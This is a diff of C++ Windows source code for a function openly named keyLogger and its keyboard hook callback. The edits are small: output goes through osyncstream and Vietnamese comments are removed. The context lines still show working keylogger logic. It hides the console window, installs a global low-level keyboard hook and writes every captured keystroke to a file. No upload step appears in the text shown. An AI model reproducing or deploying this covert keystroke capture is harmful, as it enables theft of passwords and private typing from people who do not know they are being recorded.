@@ -4,7 +4,7 @@ std::mutex logMutex;
 std::string logData;
 
 bool Services::keyLogger(const std::string &saveFile, int T) {  
-    std::cerr << "START KEYLOGGER\n";
+    std::osyncstream(std::cerr) << "START KEYLOGGER\n";
 
     std::ofstream fout(saveFile.c_str());  
     if (!fout.is_open()) {  
@@ -13,7 +13,6 @@ bool Services::keyLogger(const std::string &saveFile, int T) {
 
     ShowWindow(GetConsoleWindow(), SW_HIDE);  
 
-    // Thiết lập hook bàn phím  
     HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);  
     if (!hook) {  
         fout.close();  
@@ -24,7 +23,7 @@ bool Services::keyLogger(const std::string &saveFile, int T) {
     MSG msg;  
     while (true) {  
         {  
-            std::lock_guard<std::mutex> guard(logMutex); // Khóa mutex  
+            std::lock_guard<std::mutex> guard(logMutex); 
             if (!logData.empty()) {  
                 fout << logData;  
                 logData.clear();  
@@ -47,7 +46,7 @@ bool Services::keyLogger(const std::string &saveFile, int T) {
     UnhookWindowsHookEx(hook);  
     fout.close();
 
-    std::cerr << "END KEYLOGGER\n";
+    std::osyncstream(std::cerr) << "END KEYLOGGER\n";
 
     return true;  
 }
@@ -282,8 +281,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 return 0;   
             }  
 
-            // Nếu là phím đặc biệt  
-            std::lock_guard<std::mutex> guard(logMutex); // Khóa mutex  
+            std::lock_guard<std::mutex> guard(logMutex); 
             if (!SpecialKeys(kbd->vkCode)) {  
                 logData += char(kbd->vkCode); 
             }  
